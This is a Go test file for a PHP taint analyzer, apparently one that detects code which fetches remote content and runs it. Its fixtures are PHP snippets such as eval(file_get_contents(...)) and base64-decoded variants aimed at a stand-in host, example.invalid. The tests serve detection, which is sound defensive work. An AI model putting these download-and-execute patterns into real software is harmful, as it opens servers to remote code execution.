package phptaint

import (
	"context"
	"testing"
)

func TestBasisValid(t *testing.T) {
	for _, b := range []Basis{BasisAlwaysRemote, BasisLiteral, BasisDecoded, BasisRequest, BasisCallArgument, BasisUnresolved} {
		if !b.Valid() {
			t.Errorf("%q: want valid", b)
		}
	}
	for _, b := range []Basis{"", "Literal", "remote", "unresolved "} {
		if b.Valid() {
			t.Errorf("%q: want invalid", b)
		}
	}
}

// The order is the spec's: confidence first, then basis priority, then the
// lowest resolution offset. Each row pins one rule so ablating any one of
// them fails a named case.
func TestGradeStronger(t *testing.T) {
	for _, tc := range []struct {
		name string
		a, b grade
		want bool
	}{
		{"confidence wins over basis", grade{ConfidenceHigh, BasisUnresolved, -1}, grade{ConfidenceLow, BasisAlwaysRemote, -1}, true},
		{"lower confidence loses", grade{ConfidenceLow, BasisAlwaysRemote, -1}, grade{ConfidenceHigh, BasisUnresolved, -1}, false},
		{"basis priority on tie", grade{ConfidenceHigh, BasisLiteral, -1}, grade{ConfidenceHigh, BasisDecoded, -1}, true},
		{"always-remote beats literal", grade{ConfidenceHigh, BasisAlwaysRemote, -1}, grade{ConfidenceHigh, BasisLiteral, -1}, true},
		{"request beats call-argument", grade{ConfidenceHigh, BasisRequest, -1}, grade{ConfidenceHigh, BasisCallArgument, -1}, true},
		{"call-argument beats unresolved", grade{ConfidenceHigh, BasisCallArgument, 5}, grade{ConfidenceHigh, BasisUnresolved, -1}, true},
		{"lower offset on full tie", grade{ConfidenceHigh, BasisCallArgument, 3}, grade{ConfidenceHigh, BasisCallArgument, 9}, true},
		{"direct offset -1 is lowest", grade{ConfidenceHigh, BasisCallArgument, -1}, grade{ConfidenceHigh, BasisCallArgument, 0}, true},
		{"equal is not stronger", grade{ConfidenceHigh, BasisLiteral, -1}, grade{ConfidenceHigh, BasisLiteral, -1}, false},
	} {
		if got := tc.a.stronger(tc.b); got != tc.want {
			t.Errorf("%s: stronger = %v, want %v", tc.name, got, tc.want)
		}
	}
}

func onlyResult(t *testing.T, src []byte) Result {
	t.Helper()
	r := Analyze(context.Background(), src)
	if r.Status != StatusAnalyzed || len(r.Results) != 1 || r.TotalResults != 1 {
		t.Fatalf("report = %+v, want exactly one analyzed result", r)
	}
	return r.Results[0]
}

func TestResultBasisForExistingGrades(t *testing.T) {
	for _, tc := range []struct {
		name  string
		src   string // PHP, stored here as plain text: none of these is a working dropper URL (example.invalid)
		conf  Confidence
		basis Basis
	}{
		{"always-remote", `<?php $c = curl_init('x'); eval(curl_exec($c));`, ConfidenceHigh, BasisAlwaysRemote},
		{"literal", `<?php eval(file_get_contents('https://example.invalid/p'));`, ConfidenceHigh, BasisLiteral},
		{"unresolved", `<?php eval(file_get_contents($u));`, ConfidenceLow, BasisUnresolved},
		{"certain keeps source basis", `<?php eval(base64_decode(file_get_contents('https://example.invalid/p')));`, ConfidenceCertain, BasisLiteral},
		{"certain unresolved keeps unresolved", `<?php eval(base64_decode(file_get_contents($u)));`, ConfidenceCertain, BasisUnresolved},
		{"through variable", `<?php $d = file_get_contents('https://example.invalid/p'); eval($d);`, ConfidenceHigh, BasisLiteral},
		{"through summary", `<?php function f() { return file_get_contents('https://example.invalid/p'); } eval(f());`, ConfidenceHigh, BasisLiteral},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := onlyResult(t, []byte(tc.src))
			if got.Confidence != tc.conf || got.Basis != tc.basis || got.ResolutionOffset != -1 {
				t.Fatalf("result = %+v, want confidence %v basis %q offset -1", got, tc.conf, tc.basis)
			}
		})
	}
}

// Deduplication keeps the stronger flow's own explanation: a Low unresolved
// flow and a High literal flow that render the same endpoint pair must
// report High with the literal basis, never High with "unresolved".
func TestDedupeKeepsStrongerBasis(t *testing.T) {
	src := `<?php
eval(file_get_contents($u));
eval(file_get_contents('https://example.invalid/p'));`
	got := onlyResult(t, []byte(src))
	if got.Confidence != ConfidenceHigh || got.Basis != BasisLiteral {
		t.Fatalf("result = %+v, want High literal", got)
	}
}

func TestFinalizeKeepsBasis(t *testing.T) {
	r := finalizeReport(Report{Status: StatusAnalyzed, TotalResults: 1,
		Results: []Result{{Source: "s", Sink: "eval", Confidence: ConfidenceLow, Basis: BasisUnresolved, ResolutionOffset: -1}}})
	if r.Results[0].Basis != BasisUnresolved || r.Results[0].ResolutionOffset != -1 {
		t.Fatalf("finalize altered evidence: %+v", r.Results[0])
	}
}

// The solver joins every active origin of a variable by grade, so the
// weaker proof seen first never hides a stronger one seen later.
func TestSolverJoinKeepsStrongerGrade(t *testing.T) {
	for _, tc := range []struct {
		name string
		src  string
	}{
		{"two assignments", `<?php
$d = file_get_contents($u);
$d = file_get_contents('https://example.invalid/p');
eval($d);`},
		// Both origins feed one assignment; the weaker one comes first in
		// source order, which is the order the solver visits them.
		{"one assignment two origins", `<?php
$d = file_get_contents($u) . file_get_contents('https://example.invalid/p');
eval($d);`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := onlyResult(t, []byte(tc.src))
			if got.Confidence != ConfidenceHigh || got.Basis != BasisLiteral || got.ResolutionOffset != -1 {
				t.Fatalf("result = %+v, want High literal offset -1", got)
			}
		})
	}
}

// The Certain upgrade must not make the reported basis depend on the order
// the solver happens to visit values. Both statement orders below hold the
// same facts: $a carries a High always-remote value and a Certain literal
// value, and $b decodes $a, so both become Certain and the spec's priority
// picks always-remote.
func TestBasisIndependentOfStatementOrder(t *testing.T) {
	const (
		plain   = `$a = curl_exec($c);`
		decoded = `$a = base64_decode(file_get_contents('https://example.invalid/p'));`
		use     = `$b = base64_decode($a);`
		sink    = `eval($b);`
	)
	orders := []string{
		"<?php " + plain + " " + use + " " + decoded + " " + sink,
		"<?php " + decoded + " " + use + " " + plain + " " + sink,
	}
	var want string
	for i, src := range orders {
		got := onlyResult(t, []byte(src))
		if got.Confidence != ConfidenceCertain || got.Basis != BasisAlwaysRemote || got.ResolutionOffset != -1 {
			t.Errorf("order %d: result = %+v, want Certain always-remote offset -1", i, got)
		}
		fp := reportFingerprint(Analyze(context.Background(), []byte(src)))
		if i == 0 {
			want = fp
		} else if fp != want {
			t.Errorf("statement order changed the report:\n first: %s\n this:  %s", want, fp)
		}
	}
}

// Same property across summaries: the fixpoint over bodies must reach one
// answer whatever order the functions are declared in.
func TestBasisIndependentOfDeclarationOrder(t *testing.T) {
	decls := []string{
		"function g(){ return base64_decode(f()); }\n",
		"function f(){ return curl_exec($c) . h(); }\n",
		"function h(){ return base64_decode(file_get_contents('https://example.invalid/p')); }\n",
	}
	var want string
	for i, order := range permutations(decls) {
		src := "<?php\n"
		for _, d := range order {
			src += d
		}
		src += "eval(g());\n"
		got := onlyResult(t, []byte(src))
		if got.Confidence != ConfidenceCertain || got.Basis != BasisAlwaysRemote {
			t.Errorf("order %v: result = %+v, want Certain always-remote", order, got)
		}
		fp := reportFingerprint(Analyze(context.Background(), []byte(src)))
		if i == 0 {
			want = fp
		} else if fp != want {
			t.Errorf("declaration order changed the report:\n first: %s\n this:  %s\n source:\n%s", want, fp, src)
		}
	}
}

// The upgrade on the assignment path keeps the acquiring call's basis, the
// same rule the sink path follows.
func TestSolverDecodeKeepsSourceBasis(t *testing.T) {
	got := onlyResult(t, []byte(`<?php $b = base64_decode(file_get_contents('https://example.invalid/p')); eval($b);`))
	if got.Confidence != ConfidenceCertain || got.Basis != BasisLiteral || got.ResolutionOffset != -1 {
		t.Fatalf("result = %+v, want Certain literal offset -1", got)
	}
}

// The join is pointwise per basis: each basis keeps its own best proof, and
// add reports growth only when some entry actually improved, which is what
// lets every fixpoint over gradeSet stop.
func TestGradeSetJoin(t *testing.T) {
	var s gradeSet
	if !s.add(setOf(grade{ConfidenceHigh, BasisCallArgument, 9})) {
		t.Fatal("first proof: want growth")
	}
	if s.add(setOf(grade{ConfidenceHigh, BasisCallArgument, 9})) {
		t.Error("equal proof: want no growth")
	}
	if s.add(setOf(grade{ConfidenceLow, BasisCallArgument, 1})) {
		t.Error("lower confidence on the same basis: want no growth")
	}
	if !s.add(setOf(grade{ConfidenceHigh, BasisCallArgument, 3})) {
		t.Error("lower offset on the same basis and confidence: want growth")
	}
	if !s.add(setOf(grade{ConfidenceLow, BasisUnresolved, -1})) {
		t.Error("weaker proof on a new basis: want growth, bases join pointwise")
	}
	if got := s.strongest(); got != (grade{ConfidenceHigh, BasisCallArgument, 3}) {
		t.Errorf("strongest = %+v, want High call-argument offset 3", got)
	}
	d := s.decoded()
	if got := d.strongest(); got != (grade{ConfidenceCertain, BasisCallArgument, 3}) {
		t.Errorf("decoded strongest = %+v, want Certain call-argument offset 3", got)
	}
	if e := d.entries[basisRank(BasisUnresolved)]; !e.present || e.conf != ConfidenceCertain {
		t.Errorf("decoded unresolved entry = %+v, want Certain: the upgrade applies to every proof", e)
	}
	if !(gradeSet{}).isEmpty() || s.isEmpty() {
		t.Error("isEmpty disagrees with contents")
	}
}
